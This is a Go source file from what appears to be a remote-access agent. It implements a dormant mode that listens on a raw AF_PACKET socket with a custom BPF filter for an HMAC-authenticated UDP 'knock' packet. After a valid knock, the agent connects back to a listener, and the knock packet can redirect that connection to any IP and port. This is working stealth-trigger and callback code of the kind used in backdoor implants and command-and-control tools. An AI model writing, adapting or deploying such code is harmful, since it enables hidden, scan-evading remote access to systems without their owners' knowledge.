//go:build agent

package agent

import (
	"context"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/binary"
	"fmt"
	"unsafe"

	"golang.org/x/sys/unix"
)

const (
	knockMagic   = 0x5349504C // "SIPL" (big-endian)
	knockMinLen  = 24         // magic(4) + nonce(8) + hmac(12)
	knockFullLen = 30         // + callback IP(4) + port(2)
	hmacTruncLen = 12         // 96-bit truncated HMAC
)

// runDormant waits for an authenticated AF_PACKET knock, then transitions to
// reverse mode and dials back to the listener.
func (a *Agent) runDormant(ctx context.Context) error {
	callbackAddr, err := a.waitForKnock(ctx)
	if err != nil {
		return err
	}
	if callbackAddr != "" {
		a.cfg.Address = callbackAddr
	}
	return a.runReverse(ctx)
}

// waitForKnock opens an AF_PACKET socket with a BPF filter for the configured
// knock port and blocks until a valid authenticated knock arrives or ctx is
// cancelled. It returns the callback address (possibly overridden by the knock
// payload).
func (a *Agent) waitForKnock(ctx context.Context) (string, error) {
	port := a.cfg.KnockPort
	if port == 0 {
		return "", fmt.Errorf("knock port not configured")
	}

	// AF_PACKET / SOCK_DGRAM strips the Ethernet header, delivering packets
	// starting at the IP header. ETH_P_IP filters to IPv4 only.
	fd, err := unix.Socket(unix.AF_PACKET, unix.SOCK_DGRAM, int(htons(unix.ETH_P_IP)))
	if err != nil {
		return "", fmt.Errorf("af_packet socket: %w", err)
	}
	defer unix.Close(fd)

	// Bind to all interfaces.
	sa := &unix.SockaddrLinklayer{
		Protocol: htons(unix.ETH_P_IP),
		Ifindex:  0,
	}
	if err := unix.Bind(fd, sa); err != nil {
		return "", fmt.Errorf("bind af_packet: %w", err)
	}

	// Attach BPF: udp dst port <port>.
	filter := buildBPFFilter(port)
	prog := unix.SockFprog{
		Len:    uint16(len(filter)),
		Filter: &filter[0],
	}
	if _, _, errno := unix.Syscall6(
		unix.SYS_SETSOCKOPT,
		uintptr(fd),
		uintptr(unix.SOL_SOCKET),
		uintptr(unix.SO_ATTACH_FILTER),
		uintptr(unsafe.Pointer(&prog)),
		uintptr(unsafe.Sizeof(prog)),
		0,
	); errno != 0 {
		return "", fmt.Errorf("attach bpf: %w", errno)
	}

	// Use a goroutine + channel so we can select on ctx.Done().
	type result struct {
		addr string
		err  error
	}
	ch := make(chan result, 1)

	go func() {
		buf := make([]byte, 65535)
		for {
			n, _, err := unix.Recvfrom(fd, buf, 0)
			if err != nil {
				ch <- result{"", fmt.Errorf("recvfrom: %w", err)}
				return
			}
			if callbackAddr, ok := isValidKnock(buf[:n], port, a.cfg.PSK); ok {
				ch <- result{callbackAddr, nil}
				return
			}
		}
	}()

	select {
	case <-ctx.Done():
		// The deferred unix.Close(fd) will unblock the Recvfrom goroutine.
		return "", ctx.Err()
	case r := <-ch:
		return r.addr, r.err
	}
}

// isValidKnock parses a raw IP packet (no Ethernet header) and validates the
// knock payload against the PSK. Returns a callback address override (empty
// string if none) and whether the knock is valid.
func isValidKnock(pkt []byte, knockPort uint16, psk []byte) (callbackAddr string, ok bool) {
	// Minimum IP header is 20 bytes.
	if len(pkt) < 20 {
		return "", false
	}

	// IP header length (IHL field, lower nibble of first byte, in 32-bit words).
	ihl := int(pkt[0]&0x0F) * 4
	if ihl < 20 || len(pkt) < ihl {
		return "", false
	}

	// Protocol must be UDP (17).
	if pkt[9] != 17 {
		return "", false
	}

	// UDP header starts at ihl offset; need at least 8 bytes for the header.
	if len(pkt) < ihl+8 {
		return "", false
	}
	udp := pkt[ihl:]

	// Check destination port (bytes 2-3 of UDP header, big-endian).
	dstPort := binary.BigEndian.Uint16(udp[2:4])
	if dstPort != knockPort {
		return "", false
	}

	// UDP payload starts after the 8-byte UDP header.
	payload := udp[8:]
	if len(payload) < knockMinLen {
		return "", false
	}

	// Validate magic.
	magic := binary.BigEndian.Uint32(payload[0:4])
	if magic != knockMagic {
		return "", false
	}

	// Extract nonce and truncated HMAC.
	nonce := payload[4:12]
	gotMAC := payload[12:24]

	// Compute expected HMAC-SHA256(PSK, nonce), truncated to 96 bits.
	mac := hmac.New(sha256.New, psk)
	mac.Write(nonce)
	expectedFull := mac.Sum(nil)
	if !hmac.Equal(gotMAC, expectedFull[:hmacTruncLen]) {
		return "", false
	}

	// Optional callback address override: 4-byte IP + 2-byte port.
	if len(payload) >= knockFullLen {
		ip := fmt.Sprintf("%d.%d.%d.%d", payload[24], payload[25], payload[26], payload[27])
		port := binary.BigEndian.Uint16(payload[28:30])
		if port != 0 {
			callbackAddr = fmt.Sprintf("%s:%d", ip, port)
		}
	}

	return callbackAddr, true
}

// buildBPFFilter returns BPF bytecode equivalent to "udp dst port <port>".
// Generated via `tcpdump -dd 'udp dst port <port>'` and parameterized.
// This filter operates on SOCK_DGRAM packets (IP header at offset 0).
func buildBPFFilter(port uint16) []unix.SockFilter {
	return []unix.SockFilter{
		// 0: Load IP protocol field (offset 9).
		{Code: 0x30, Jt: 0, Jf: 0, K: 9},
		// 1: If UDP (17) continue, else jump to reject (instruction 9).
		{Code: 0x15, Jt: 0, Jf: 7, K: 17},
		// 2: Load first byte of IP header.
		{Code: 0x30, Jt: 0, Jf: 0, K: 0},
		// 3: Mask IHL (lower nibble).
		{Code: 0x54, Jt: 0, Jf: 0, K: 0x0F},
		// 4: Multiply by 4 (IHL is in 32-bit words).
		{Code: 0x64, Jt: 0, Jf: 0, K: 2},
		// 5: TAX — move A (IHL*4) into X.
		{Code: 0x07, Jt: 0, Jf: 0, K: 0},
		// 6: Load UDP dst port at [X+2] (16-bit).
		{Code: 0x48, Jt: 0, Jf: 0, K: 2},
		// 7: If port matches accept, else reject.
		{Code: 0x15, Jt: 0, Jf: 1, K: uint32(port)},
		// 8: RET accept.
		{Code: 0x06, Jt: 0, Jf: 0, K: 0x00040000},
		// 9: RET reject.
		{Code: 0x06, Jt: 0, Jf: 0, K: 0x00000000},
	}
}

// htons converts a uint16 from host to network byte order.
func htons(v uint16) uint16 {
	b := [2]byte{}
	binary.BigEndian.PutUint16(b[:], v)
	return *(*uint16)(unsafe.Pointer(&b[0]))
}
